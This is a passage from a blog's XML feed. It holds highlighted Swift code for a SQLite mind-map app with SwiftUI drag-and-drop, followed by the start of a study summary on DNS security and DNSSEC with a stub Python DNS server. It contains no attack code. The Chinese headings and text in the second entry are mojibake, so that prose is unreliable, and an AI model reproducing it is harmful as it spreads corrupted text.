<span class="hljs-number">1</span>).flatMap &#123; <span class="hljs-type">String</span>(cString: <span class="hljs-variable">$0</span>) &#125;<br>                        <span class="hljs-keyword">let</span> title <span class="hljs-operator">=</span> <span class="hljs-type">String</span>(cString: sqlite3_column_text(stmt, <span class="hljs-number">2</span>))<br>                        <span class="hljs-keyword">let</span> content <span class="hljs-operator">=</span> sqlite3_column_text(stmt, <span class="hljs-number">3</span>).flatMap &#123; <span class="hljs-type">String</span>(cString: <span class="hljs-variable">$0</span>) &#125;<br>                        <span class="hljs-keyword">let</span> position <span class="hljs-operator">=</span> <span class="hljs-type">Int</span>(sqlite3_column_int(stmt, <span class="hljs-number">4</span>))<br>                        <span class="hljs-keyword">let</span> color <span class="hljs-operator">=</span> sqlite3_column_text(stmt, <span class="hljs-number">5</span>).flatMap &#123; <span class="hljs-type">String</span>(cString: <span class="hljs-variable">$0</span>) &#125;<br>                        <span class="hljs-comment">// created_at/updated_at are read as strings; parsing omitted for brevity</span><br>                        <span class="hljs-keyword">let</span> node <span class="hljs-operator">=</span> <span class="hljs-type">MindMapNode</span>(id: id, parentId: pid, title: title, content: content, position: position, color: color)<br>                        arr.append(node)<br>                    &#125;<br>                    cont.resume(returning: arr)<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    cont.resume(throwing: <span class="hljs-type">DatabaseError</span>.queryFailed(message: <span class="hljs-string">&quot;refresh prepare failed&quot;</span>))<br>                &#125;<br>                sqlite3_finalize(stmt)<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">self</span>.flatNodes <span class="hljs-operator">=</span> nodes<br>    &#125;<br><br>    <span class="hljs-comment">// MARK: - Publishers</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">flatNodesPublisher</span>() -&gt; <span class="hljs-type">AnyPublisher</span>&lt;[<span class="hljs-type">MindMapNode</span>], <span class="hljs-type">Never</span>&gt; &#123;<br>        <span class="hljs-variable">$flatNodes</span>.eraseToAnyPublisher()<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">treePublisher</span>() -&gt; <span class="hljs-type">AnyPublisher</span>&lt;[<span class="hljs-type">MindMapTree</span>], <span class="hljs-type">Never</span>&gt; &#123;<br>        <span class="hljs-variable">$tree</span>.eraseToAnyPublisher()<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// MARK: - SwiftUI Helpers: DropDelegate for hierarchical drops</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">NodeDropDelegate</span>: <span class="hljs-title class_ inherited__">DropDelegate</span> &#123;<br>    <span class="hljs-keyword">let</span> targetNode: <span class="hljs-type">MindMapNode</span>?<br>    <span class="hljs-keyword">let</span> onDrop: (<span class="hljs-type">MindMapNode</span>, <span class="hljs-type">MindMapNode</span>?) -&gt; <span class="hljs-type">Void</span><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">performDrop</span>(<span class="hljs-params">info</span>: <span class="hljs-type">DropInfo</span>) -&gt; <span class="hljs-type">Bool</span> &#123;<br>        <span class="hljs-keyword">guard</span> <span class="hljs-keyword">let</span> provider <span class="hljs-operator">=</span> info.itemProviders(for: [<span class="hljs-type">UTType</span>.text]).first <span class="hljs-keyword">else</span> &#123; <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span> &#125;<br>        provider.loadItem(forTypeIdentifier: <span class="hljs-type">UTType</span>.text.identifier, options: <span class="hljs-literal">nil</span>) &#123; data, <span class="hljs-keyword">_</span> <span class="hljs-keyword">in</span><br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">let</span> data <span class="hljs-operator">=</span> data <span class="hljs-keyword">as?</span> <span class="hljs-type">Data</span>, <span class="hljs-keyword">let</span> id <span class="hljs-operator">=</span> <span class="hljs-type">String</span>(data: data, encoding: .utf8) &#123;<br>                <span class="hljs-type">Task</span> &#123; <span class="hljs-meta">@MainActor</span> <span class="hljs-keyword">in</span><br>                    <span class="hljs-keyword">if</span> <span class="hljs-keyword">let</span> dragged <span class="hljs-operator">=</span> <span class="hljs-type">SQLiteMindMap</span>.shared.flatNodes.first(where: &#123; <span class="hljs-variable">$0</span>.id <span class="hljs-operator">==</span> id &#125;) &#123;<br>                        onDrop(dragged, targetNode)<br>                    &#125;<br>                &#125;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> <span class="hljs-keyword">let</span> str <span class="hljs-operator">=</span> data <span class="hljs-keyword">as?</span> <span class="hljs-type">String</span> &#123;<br>                <span class="hljs-type">Task</span> &#123; <span class="hljs-meta">@MainActor</span> <span class="hljs-keyword">in</span><br>                    <span class="hljs-keyword">if</span> <span class="hljs-keyword">let</span> dragged <span class="hljs-operator">=</span> <span class="hljs-type">SQLiteMindMap</span>.shared.flatNodes.first(where: &#123; <span class="hljs-variable">$0</span>.id <span class="hljs-operator">==</span> str &#125;) &#123;<br>                        onDrop(dragged, targetNode)<br>                    &#125;<br>                &#125;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// MARK: - SwiftUI Example: Hierarchical MindMap View</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">struct HierarchicalMindMapView: View &#123;</span><br><span class="hljs-comment">    @StateObject private var db = SQLiteMindMap.shared</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    var body: some View &#123;</span><br><span class="hljs-comment">        ScrollView &#123;</span><br><span class="hljs-comment">            VStack(alignment: .leading) &#123;</span><br><span class="hljs-comment">                ForEach(db.tree) &#123; root in</span><br><span class="hljs-comment">                    TreeNodeView(tree: root)</span><br><span class="hljs-comment">                &#125;</span><br><span class="hljs-comment">            &#125;</span><br><span class="hljs-comment">            .padding()</span><br><span class="hljs-comment">        &#125;</span><br><span class="hljs-comment">        .task &#123;</span><br><span class="hljs-comment">            // example bootstrapping</span><br><span class="hljs-comment">            if db.flatNodes.isEmpty &#123;</span><br><span class="hljs-comment">                let r = MindMapNode(title: &quot;Root&quot;)</span><br><span class="hljs-comment">                try? await db.insertNode(r)</span><br><span class="hljs-comment">                let c1 = MindMapNode(parentId: r.id, title: &quot;Child A&quot;, position: 0)</span><br><span class="hljs-comment">                try? await db.insertNode(c1)</span><br><span class="hljs-comment">                let c2 = MindMapNode(parentId: r.id, title: &quot;Child B&quot;, position: 1)</span><br><span class="hljs-comment">                try? await db.insertNode(c2)</span><br><span class="hljs-comment">            &#125;</span><br><span class="hljs-comment">        &#125;</span><br><span class="hljs-comment">    &#125;</span><br><span class="hljs-comment">&#125;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">struct TreeNodeView: View &#123;</span><br><span class="hljs-comment">    var tree: MindMapTree</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    var body: some View &#123;</span><br><span class="hljs-comment">        DisclosureGroup(tree.node.title) &#123;</span><br><span class="hljs-comment">            ForEach(tree.children) &#123; child in</span><br><span class="hljs-comment">                TreeNodeView(tree: child)</span><br><span class="hljs-comment">                    .padding(.leading, 16)</span><br><span class="hljs-comment">                    .onDrag &#123;</span><br><span class="hljs-comment">                        NSItemProvider(object: child.node.id as NSString)</span><br><span class="hljs-comment">                    &#125;</span><br><span class="hljs-comment">                    .onDrop(of: [UTType.text], delegate: NodeDropDelegate(targetNode: child.node, onDrop: handleDrop))</span><br><span class="hljs-comment">            &#125;</span><br><span class="hljs-comment">        &#125;</span><br><span class="hljs-comment">        .onDrag &#123; NSItemProvider(object: tree.node.id as NSString) &#125;</span><br><span class="hljs-comment">        .onDrop(of: [UTType.text], delegate: NodeDropDelegate(targetNode: tree.node, onDrop: handleDrop))</span><br><span class="hljs-comment">    &#125;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    func handleDrop(dragged: MindMapNode, target: MindMapNode?) &#123;</span><br><span class="hljs-comment">        Task &#123;</span><br><span class="hljs-comment">            // Insert dragged as child of target (or as root if target == nil) at position 0</span><br><span class="hljs-comment">            try? await SQLiteMindMap.shared.updateNodeParent(id: dragged.id, newParentId: target?.id, position: 0)</span><br><span class="hljs-comment">        &#125;</span><br><span class="hljs-comment">    &#125;</span><br><span class="hljs-comment">&#125;</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-comment">// End of file</span><br><br><span class="hljs-keyword">import</span> Combine<br><span class="hljs-keyword">import</span> SwiftUI<br><span class="hljs-keyword">import</span> UniformTypeIdentifiers<br><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">EnhancedMindMapView</span>: <span class="hljs-title class_ inherited__">View</span> &#123;<br>    <span class="hljs-meta">@StateObject</span> <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> db <span class="hljs-operator">=</span> <span class="hljs-type">SQLiteMindMap</span>.shared<br>    <span class="hljs-meta">@State</span> <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> editingNode: <span class="hljs-type">MindMapNode</span>?<br>    <span class="hljs-meta">@State</span> <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> showAddNodeSheet <span class="hljs-operator">=</span> <span class="hljs-literal">false</span><br>    <span class="hljs-meta">@State</span> <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> draggedNode: <span class="hljs-type">MindMapNode</span>?<br>    <span class="hljs-meta">@State</span> <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> dropTargetNode: <span class="hljs-type">MindMapNode</span>?<br><br>    <span class="hljs-keyword">var</span> body: <span class="hljs-keyword">some</span> <span class="hljs-type">View</span> &#123;<br>        <span class="hljs-type">NavigationView</span> &#123;<br>            <span class="hljs-type">ScrollView</span> &#123;<br>                <span class="hljs-type">VStack</span>(alignment: .leading, spacing: <span class="hljs-number">4</span>) &#123;<br>                    <span class="hljs-type">ForEach</span>(db.tree) &#123; root <span class="hljs-keyword">in</span><br>                        <span class="hljs-type">EnhancedTreeNodeView</span>(tree: root, draggedNode: <span class="hljs-variable">$draggedNode</span>, dropTargetNode: <span class="hljs-variable">$dropTargetNode</span>, onEdit: editNode, onDelete: deleteNode, onAddChild: addChildNode)<br>                    &#125;<br>                &#125;<br>                .padding()<br>            &#125;<br>            .navigationTitle(<span class="hljs-string">&quot;Mind Map&quot;</span>)<br>            .toolbar &#123;<br>                <span class="hljs-type">ToolbarItem</span>(placement: .navigationBarTrailing) &#123;<br>                    <span class="hljs-type">Button</span>(action: &#123; showAddNodeSheet <span class="hljs-operator">=</span> <span class="hljs-literal">true</span> &#125;) &#123;<br>                        <span class="hljs-type">Image</span>(systemName: <span class="hljs-string">&quot;plus&quot;</span>)<br>                    &#125;<br>                &#125;<br>            &#125;<br>            .sheet(isPresented: <span class="hljs-variable">$showAddNodeSheet</span>) &#123;<br>                <span class="hljs-keyword">if</span> <span class="hljs-keyword">let</span> parent <span class="hljs-operator">=</span> dropTargetNode &#123;<br>                    <span class="hljs-type">NodeEditView</span>(node: <span class="hljs-type">MindMapNode</span>(parentId: parent.id, title: <span class="hljs-string">&quot;&quot;</span>)) &#123; newNode <span class="hljs-keyword">in</span><br>                        <span class="hljs-type">Task</span> &#123; <span class="hljs-keyword">try?</span> <span class="hljs-keyword">await</span> db.insertNode(newNode) &#125;<br>                    &#125;<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-type">NodeEditView</span>(node: <span class="hljs-type">MindMapNode</span>(title: <span class="hljs-string">&quot;&quot;</span>)) &#123; newNode <span class="hljs-keyword">in</span><br>                        <span class="hljs-type">Task</span> &#123; <span class="hljs-keyword">try?</span> <span class="hljs-keyword">await</span> db.insertNode(newNode) &#125;<br>                    &#125;<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">func</span> <span class="hljs-title function_">editNode</span>(<span class="hljs-keyword">_</span> <span class="hljs-params">node</span>: <span class="hljs-type">MindMapNode</span>) &#123;<br>        editingNode <span class="hljs-operator">=</span> node<br>        showAddNodeSheet <span class="hljs-operator">=</span> <span class="hljs-literal">true</span><br>    &#125;<br><br>    <span class="hljs-keyword">func</span> <span class="hljs-title function_">deleteNode</span>(<span class="hljs-keyword">_</span> <span class="hljs-params">node</span>: <span class="hljs-type">MindMapNode</span>) &#123;<br>        <span class="hljs-type">Task</span> &#123; <span class="hljs-keyword">try?</span> <span class="hljs-keyword">await</span> db.deleteNode(id: node.id) &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">func</span> <span class="hljs-title function_">addChildNode</span>(<span class="hljs-keyword">_</span> <span class="hljs-params">parent</span>: <span class="hljs-type">MindMapNode</span>) &#123;<br>        dropTargetNode <span class="hljs-operator">=</span> parent<br>        showAddNodeSheet <span class="hljs-operator">=</span> <span class="hljs-literal">true</span><br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">EnhancedTreeNodeView</span>: <span class="hljs-title class_ inherited__">View</span> &#123;<br>    <span class="hljs-keyword">var</span> tree: <span class="hljs-type">MindMapTree</span><br>    <span class="hljs-meta">@Binding</span> <span class="hljs-keyword">var</span> draggedNode: <span class="hljs-type">MindMapNode</span>?<br>    <span class="hljs-meta">@Binding</span> <span class="hljs-keyword">var</span> dropTargetNode: <span class="hljs-type">MindMapNode</span>?<br>    <span class="hljs-keyword">var</span> onEdit: (<span class="hljs-type">MindMapNode</span>) -&gt; <span class="hljs-type">Void</span><br>    <span class="hljs-keyword">var</span> onDelete: (<span class="hljs-type">MindMapNode</span>) -&gt; <span class="hljs-type">Void</span><br>    <span class="hljs-keyword">var</span> onAddChild: (<span class="hljs-type">MindMapNode</span>) -&gt; <span class="hljs-type">Void</span><br><br>    <span class="hljs-keyword">var</span> body: <span class="hljs-keyword">some</span> <span class="hljs-type">View</span> &#123;<br>        <span class="hljs-type">VStack</span>(alignment: .leading, spacing: <span class="hljs-number">2</span>) &#123;<br>            <span class="hljs-type">HStack</span> &#123;<br>                <span class="hljs-type">Text</span>(tree.node.title)<br>                    .padding(<span class="hljs-number">4</span>)<br>                    .background(dropTargetNode<span class="hljs-operator">?</span>.id <span class="hljs-operator">==</span> tree.node.id <span class="hljs-operator">?</span> <span class="hljs-type">Color</span>.blue.opacity(<span class="hljs-number">0.3</span>) : <span class="hljs-type">Color</span>.clear)<br>                    .cornerRadius(<span class="hljs-number">6</span>)<br>                <span class="hljs-type">Spacer</span>()<br>                <span class="hljs-type">Menu</span> &#123;<br>                    <span class="hljs-type">Button</span>(<span class="hljs-string">&quot;Add Child&quot;</span>) &#123; onAddChild(tree.node) &#125;<br>                    <span class="hljs-type">Button</span>(<span class="hljs-string">&quot;Edit&quot;</span>) &#123; onEdit(tree.node) &#125;<br>                    <span class="hljs-type">Button</span>(<span class="hljs-string">&quot;Delete&quot;</span>) &#123; onDelete(tree.node) &#125;<br>                &#125; label: &#123;<br>                    <span class="hljs-type">Image</span>(systemName: <span class="hljs-string">&quot;ellipsis.circle&quot;</span>)<br>                        .imageScale(.large)<br>                &#125;<br>            &#125;<br>            .onDrag &#123;<br>                draggedNode <span class="hljs-operator">=</span> tree.node<br>                <span class="hljs-keyword">return</span> <span class="hljs-type">NSItemProvider</span>(object: tree.node.id <span class="hljs-keyword">as</span> <span class="hljs-type">NSString</span>)<br>            &#125;<br>            .onDrop(of: [<span class="hljs-type">UTType</span>.text], delegate: <span class="hljs-type">DropViewDelegate</span>(targetNode: tree.node, draggedNode: <span class="hljs-variable">$draggedNode</span>, dropTargetNode: <span class="hljs-variable">$dropTargetNode</span>))<br><br>            <span class="hljs-keyword">if</span> <span class="hljs-operator">!</span>tree.children.isEmpty &#123;<br>                <span class="hljs-type">VStack</span>(alignment: .leading, spacing: <span class="hljs-number">2</span>) &#123;<br>                    <span class="hljs-type">ForEach</span>(tree.children) &#123; child <span class="hljs-keyword">in</span><br>                        <span class="hljs-type">EnhancedTreeNodeView</span>(tree: child, draggedNode: <span class="hljs-variable">$draggedNode</span>, dropTargetNode: <span class="hljs-variable">$dropTargetNode</span>, onEdit: onEdit, onDelete: onDelete, onAddChild: onAddChild)<br>                            .padding(.leading, <span class="hljs-number">16</span>)<br>                            .animation(.default, value: child.node.id)<br>                    &#125;<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">DropViewDelegate</span>: <span class="hljs-title class_ inherited__">DropDelegate</span> &#123;<br>    <span class="hljs-keyword">let</span> targetNode: <span class="hljs-type">MindMapNode</span><br>    <span class="hljs-meta">@Binding</span> <span class="hljs-keyword">var</span> draggedNode: <span class="hljs-type">MindMapNode</span>?<br>    <span class="hljs-meta">@Binding</span> <span class="hljs-keyword">var</span> dropTargetNode: <span class="hljs-type">MindMapNode</span>?<br><br>    <span class="hljs-keyword">func</span> <span class="hljs-title function_">validateDrop</span>(<span class="hljs-params">info</span>: <span class="hljs-type">DropInfo</span>) -&gt; <span class="hljs-type">Bool</span> &#123;<br>        <span class="hljs-keyword">return</span> draggedNode <span class="hljs-operator">!=</span> <span class="hljs-literal">nil</span> <span class="hljs-operator">&amp;&amp;</span> draggedNode<span class="hljs-operator">?</span>.id <span class="hljs-operator">!=</span> targetNode.id<br>    &#125;<br><br>    <span class="hljs-keyword">func</span> <span class="hljs-title function_">dropEntered</span>(<span class="hljs-params">info</span>: <span class="hljs-type">DropInfo</span>) &#123;<br>        dropTargetNode <span class="hljs-operator">=</span> targetNode<br>    &#125;<br><br>    <span class="hljs-keyword">func</span> <span class="hljs-title function_">performDrop</span>(<span class="hljs-params">info</span>: <span class="hljs-type">DropInfo</span>) -&gt; <span class="hljs-type">Bool</span> &#123;<br>        <span class="hljs-keyword">guard</span> <span class="hljs-keyword">let</span> dragged <span class="hljs-operator">=</span> draggedNode <span class="hljs-keyword">else</span> &#123; <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span> &#125;<br>        <span class="hljs-type">Task</span> &#123;<br>            <span class="hljs-keyword">try?</span> <span class="hljs-keyword">await</span> <span class="hljs-type">SQLiteMindMap</span>.shared.updateNodeParent(id: dragged.id, newParentId: targetNode.id, position: <span class="hljs-number">0</span>)<br>        &#125;<br>        draggedNode <span class="hljs-operator">=</span> <span class="hljs-literal">nil</span><br>        dropTargetNode <span class="hljs-operator">=</span> <span class="hljs-literal">nil</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">NodeEditView</span>: <span class="hljs-title class_ inherited__">View</span> &#123;<br>    <span class="hljs-meta">@Environment</span>(\.dismiss) <span class="hljs-keyword">var</span> dismiss<br>    <span class="hljs-meta">@State</span> <span class="hljs-keyword">var</span> node: <span class="hljs-type">MindMapNode</span><br>    <span class="hljs-keyword">var</span> onSave: (<span class="hljs-type">MindMapNode</span>) -&gt; <span class="hljs-type">Void</span><br><br>    <span class="hljs-keyword">var</span> body: <span class="hljs-keyword">some</span> <span class="hljs-type">View</span> &#123;<br>        <span class="hljs-type">NavigationView</span> &#123;<br>            <span class="hljs-type">Form</span> &#123;<br>                <span class="hljs-type">TextField</span>(<span class="hljs-string">&quot;Title&quot;</span>, text: <span class="hljs-variable">$node</span>.title)<br>                <span class="hljs-type">TextField</span>(<span class="hljs-string">&quot;Content&quot;</span>, text: <span class="hljs-type">Binding</span>(<br>                    get: &#123; node.content <span class="hljs-operator">??</span> <span class="hljs-string">&quot;&quot;</span> &#125;,<br>                    set: &#123; node.content <span class="hljs-operator">=</span> <span class="hljs-variable">$0</span> &#125;<br>                ))<br>                <span class="hljs-type">ColorPicker</span>(<span class="hljs-string">&quot;Color&quot;</span>, selection: <span class="hljs-type">Binding</span>(<br>                    get: &#123; <span class="hljs-type">Color</span>(node.color <span class="hljs-operator">??</span> <span class="hljs-string">&quot;#FFFFFF&quot;</span>) &#125;,<br>                    set: &#123; node.color <span class="hljs-operator">=</span> <span class="hljs-variable">$0</span>.toHex() &#125;<br>                ))<br>            &#125;<br>            .navigationTitle(node.title.isEmpty <span class="hljs-operator">?</span> <span class="hljs-string">&quot;New Node&quot;</span> : <span class="hljs-string">&quot;Edit Node&quot;</span>)<br>            .toolbar &#123;<br>                <span class="hljs-type">ToolbarItem</span>(placement: .confirmationAction) &#123;<br>                    <span class="hljs-type">Button</span>(<span class="hljs-string">&quot;Save&quot;</span>) &#123;<br>                        onSave(node)<br>                        dismiss()<br>                    &#125;<br>                &#125;<br>                <span class="hljs-type">ToolbarItem</span>(placement: .cancellationAction) &#123;<br>                    <span class="hljs-type">Button</span>(<span class="hljs-string">&quot;Cancel&quot;</span>) &#123; dismiss() &#125;<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// Color extension for hex conversion</span><br><span class="hljs-keyword">extension</span> <span class="hljs-title class_">Color</span> &#123;<br>    <span class="hljs-keyword">init</span>(<span class="hljs-keyword">_</span> <span class="hljs-params">hex</span>: <span class="hljs-type">String</span>) &#123;<br>        <span class="hljs-keyword">let</span> hex <span class="hljs-operator">=</span> hex.trimmingCharacters(in: <span class="hljs-type">CharacterSet</span>.alphanumerics.inverted)<br>        <span class="hljs-keyword">var</span> int: <span class="hljs-type">UInt64</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span><br>        <span class="hljs-type">Scanner</span>(string: hex).scanHexInt64(<span class="hljs-operator">&amp;</span>int)<br>        <span class="hljs-keyword">let</span> r, g, b: <span class="hljs-type">UInt64</span><br>        (r, g, b) <span class="hljs-operator">=</span> ((int <span class="hljs-operator">&gt;&gt;</span> <span class="hljs-number">16</span>) <span class="hljs-operator">&amp;</span> <span class="hljs-number">0xFF</span>, (int <span class="hljs-operator">&gt;&gt;</span> <span class="hljs-number">8</span>) <span class="hljs-operator">&amp;</span> <span class="hljs-number">0xFF</span>, int <span class="hljs-operator">&amp;</span> <span class="hljs-number">0xFF</span>)<br>        <span class="hljs-keyword">self</span>.<span class="hljs-keyword">init</span>(red: <span class="hljs-type">Double</span>(r)<span class="hljs-regexp">/255, green: Double(g)/</span><span class="hljs-number">255</span>, blue: <span class="hljs-type">Double</span>(b)<span class="hljs-operator">/</span><span class="hljs-number">255</span>)<br>    &#125;<br><br>    <span class="hljs-keyword">func</span> <span class="hljs-title function_">toHex</span>() -&gt; <span class="hljs-type">String</span> &#123;<br>        <span class="hljs-keyword">let</span> uiColor <span class="hljs-operator">=</span> <span class="hljs-type">UIColor</span>(<span class="hljs-keyword">self</span>)<br>        <span class="hljs-keyword">var</span> r: <span class="hljs-type">CGFloat</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>, g: <span class="hljs-type">CGFloat</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>, b: <span class="hljs-type">CGFloat</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>, a: <span class="hljs-type">CGFloat</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span><br>        uiColor.getRed(<span class="hljs-operator">&amp;</span>r, green: <span class="hljs-operator">&amp;</span>g, blue: <span class="hljs-operator">&amp;</span>b, alpha: <span class="hljs-operator">&amp;</span>a)<br>        <span class="hljs-keyword">return</span> <span class="hljs-type">String</span>(format: <span class="hljs-string">&quot;%02X%02X%02X&quot;</span>, <span class="hljs-type">Int</span>(r<span class="hljs-operator">*</span><span class="hljs-number">255</span>), <span class="hljs-type">Int</span>(g<span class="hljs-operator">*</span><span class="hljs-number">255</span>), <span class="hljs-type">Int</span>(b<span class="hljs-operator">*</span><span class="hljs-number">255</span>))<br>    &#125;<br>&#125;<br><br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Swift</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Swift, MindMap,</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>å…­å‘¨åç»­å†…å®¹æ€»ç»“</title>
    <link href="/2025/11/10/%E5%85%AD%E5%91%A8%E5%90%8E%E7%BB%AD%E5%86%85%E5%AE%B9%E6%80%BB%E7%BB%93/"/>
    <url>/2025/11/10/%E5%85%AD%E5%91%A8%E5%90%8E%E7%BB%AD%E5%86%85%E5%AE%B9%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h1 id="Day-36-40-ç¬¬å…­å‘¨åç»­å†…å®¹æ€»ç»“"><a href="#Day-36-40-ç¬¬å…­å‘¨åç»­å†…å®¹æ€»ç»“" class="headerlink" title="Day 36-40: ç¬¬å…­å‘¨åç»­å†…å®¹æ€»ç»“"></a>Day 36-40: ç¬¬å…­å‘¨åç»­å†…å®¹æ€»ç»“</h1><h2 id="Day-36-DNSå®‰å…¨ï¼ˆDNSSECï¼‰"><a href="#Day-36-DNSå®‰å…¨ï¼ˆDNSSECï¼‰" class="headerlink" title="Day 36: DNSå®‰å…¨ï¼ˆDNSSECï¼‰"></a>Day 36: DNSå®‰å…¨ï¼ˆDNSSECï¼‰</h2><p><strong>æ ¸å¿ƒå†…å®¹</strong>ï¼š</p><ul><li>DNSå®‰å…¨å¨èƒï¼ˆç¼“å­˜æŠ•æ¯’ã€åŠ«æŒï¼‰</li><li>DNSSECåŸç†</li><li>æ•°å­—ç­¾åéªŒè¯</li><li>DNS over HTTPS (DoH)</li><li>DNS over TLS (DoT)</li></ul><p><strong>å…³é”®çŸ¥è¯†ç‚¹</strong>ï¼š</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">DNSå®‰å…¨å¨èƒï¼š<br><span class="hljs-bullet">- </span>ç¼“å­˜æŠ•æ¯’ï¼šæ”»å‡»è€…æ³¨å…¥è™šå‡DNSè®°å½•<br><span class="hljs-bullet">- </span>DNSåŠ«æŒï¼šé‡å®šå‘åˆ°æ¶æ„ç½‘ç«™<br><span class="hljs-bullet">- </span>ä¸­é—´äººæ”»å‡»ï¼šçªƒå¬DNSæŸ¥è¯¢<br><br>DNSSECé˜²æŠ¤ï¼š<br><span class="hljs-bullet">- </span>æ•°å­—ç­¾åï¼šéªŒè¯DNSè®°å½•çœŸå®æ€§<br><span class="hljs-bullet">- </span>ä¿¡ä»»é“¾ï¼šä»æ ¹åˆ°å¶çš„éªŒè¯é“¾<br><span class="hljs-bullet">- </span>è®°å½•ç±»å‹ï¼šRRSIG, DNSKEY, DS, NSEC<br></code></pre></td></tr></table></figure><hr><h2 id="Day-37-å®æˆ˜-DNSæœåŠ¡å™¨å®ç°"><a href="#Day-37-å®æˆ˜-DNSæœåŠ¡å™¨å®ç°" class="headerlink" title="Day 37: å®æˆ˜ - DNSæœåŠ¡å™¨å®ç°"></a>Day 37: å®æˆ˜ - DNSæœåŠ¡å™¨å®ç°</h2><p><strong>æ ¸å¿ƒå†…å®¹</strong>ï¼š</p><ul><li>å®ç°ç®€å•çš„DNSæœåŠ¡å™¨</li><li>å¤„ç†DNSæŸ¥è¯¢è¯·æ±‚</li><li>è¿”å›DNSå“åº”</li><li>æœ¬åœ°DNSç¼“å­˜</li></ul><p><strong>é¡¹ç›®åŠŸèƒ½</strong>ï¼š</p><ul><li>æ¥æ”¶UDP DNSæŸ¥è¯¢</li><li>è§£ææŸ¥è¯¢æŠ¥æ–‡</li><li>æŸ¥æ‰¾æœ¬åœ°è®°å½•</li><li>æ„é€ å¹¶è¿”å›å“åº”</li><li>æ”¯æŒAã€AAAAã€CNAMEè®°å½•</li></ul><p><strong>ä»£ç æ¡†æ¶</strong>ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">SimpleDNSServer</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, port=<span class="hljs-number">53</span></span>):<br>        <span class="hljs-variable language_">self</span>.records = &#123;&#125;<br>        <span class="hljs-variable language_">self</span>.cache = &#123;&#125;<br>    <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">add_record</span>(<span class="hljs-params">self, domain, rtype, rdata</span>):<br>        <span class="hljs-string">&quot;&quot;&quot;æ·»åŠ DNSè®°å½•&quot;&quot;&quot;</span><br>        <span class="hljs-keyword">pass</span><br>    <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">handle_query</span>(<span class="hljs-params">self, query_data</span>):<br>        <span class="hljs-string">&quot;&quot;&quot;å¤„ç†DNSæŸ¥è¯¢&quot;&quot;&quot;</span><br>        <span class="hljs-keyword">pass</span><br>    <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">build_response</span>(<span class="hljs-params">self, query, answers</span>):<br>        <span class="hljs-string">&quot;&quot;&quot;æ„é€ DNSå“åº”&quot;&quot;&quot;</span><br>        <span class="hljs-keyword">pass</span><br>    <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">start</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-string">&quot;&quot;&quot;å¯åŠ¨DNSæœåŠ¡å™¨&quot;&quot;&quot;</span><br>        <span 